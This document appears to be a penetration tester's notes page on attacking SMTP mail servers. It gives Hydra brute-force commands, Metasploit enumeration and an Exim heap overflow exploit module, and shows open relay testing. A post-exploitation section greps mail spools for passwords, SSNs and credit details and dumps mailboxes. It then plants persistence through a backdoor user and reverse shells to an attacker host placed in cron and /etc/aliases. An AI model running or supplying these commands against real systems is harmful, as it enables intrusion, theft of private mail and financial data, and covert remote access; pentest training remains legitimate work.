---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMTP/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Brute Force {{{-->
## Brute Force

Brute force SMTP authentication credentials using various tools

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
<!-- }}} -->

[[Hydra]] — Brute force with user

```sh
hydra -l user@target.com -P <passwords.txt> smtp://<target.com>:587
```

[[Hydra]] — Brute force with username list

```sh
hydra -L <usernames.txt> -P <passwords.txt> smtp://<target.com>:587
```

[[Metasploit]] — SMTP User Enumeration Utility

```sh
use auxiliary/scanner/smtp/smtp_enum
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> search smtp
> ```
>
> ```sh
> use auxiliary/scanner/smtp/smtp_enum
> ```
>
> ```sh
> set RHOSTS <target>
> ```
>
> ```sh
> run
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- CVE-2010-4344 {{{-->
### CVE-2010-4344

[[Metasploit]] — Exim4 string_format Function Heap Buffer Overflow
(*[exim4_string_format](https://www.rapid7.com/db/modules/exploit/unix/smtp/exim4_string_format/)*)

```sh
use exploit/unix/smtp/exim4_string_format
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Launch Metasploit|Launch Metasploit]]
>
> 2. [[Metasploit#Select Exploit|Select Exploit]]
>
> ```sh
> use exploit/unix/smtp/exim4_string_format
> ```
>
> 3. Show possible targets
>
> ```sh
> show targets
> ```
>
> 4. Set target
>
> ```sh
> set TARGET <target_id>
> ```
>
> 5. [[Metasploit#Show Options|Show Options]]
>
> ```sh
> show options
> ```
>
> 6. [[Metasploit#Set Options|Set Options]]
>
> 7. [[Metasploit#Check Exploit|Check Exploit]]
>
> 8. [[Metasploit#Run Exploit|Run Exploit]]
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Open Relay Attack {{{-->
## Open Relay Attack

> [!todo]
>
> - [HackTricks - Open Relay](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html#open-relay)
>
> - [Hackviser](https://hackviser.com/tactics/pentesting/services/smtp#open-relay-testing)

Test SMTP server for open relay vulnerabilities
[[Networking/Services/SMTP/General#Open Relay Configuration]]
that allow unauthorized email forwarding

<!-- Example {{{-->
> [!example]-
>
> External to external
>
> ```sh
> telnet <target> 25
> ```
> ```
> MAIL FROM:<external1@example.com>
> RCPT TO:<external2@anotherdomain.com>
> DATA
> Test
> .
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Search for sensitive keywords

```sh
grep -r -i "password\|secret\|confidential" /var/mail/
```

Extract attachments

```sh
find /var/mail/ -name "*.pdf" -o -name "*.doc" -o -name "*.xls"
```

Extract e-mail addresses

```sh
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' /var/mail/*
```

Extract financial information

```sh
grep -r -i "account\|routing\|ssn\|credit" /var/mail/
```

<!-- Email Harvesting {{{-->
### Email Harvesting

Read mail spool

```sh
cat /var/mail/<username>
```

```sh
cat /var/spool/mail/<username>
```

Maildir Format

```sh
ls -la /home/username/Maildir/cur/
```

```sh
cat /home/username/Maildir/cur/*
```

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Add backdoor user to mail system

```sh
useradd -m -s /bin/bash <user>
```
```sh
echo "<user>:<password>" | chpasswd
```

Create cron job

```sh
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" | crontab -
```

Modify mail aliases

```sh
echo "backdoor: |/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" >> /etc/aliases
newaliases
```

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
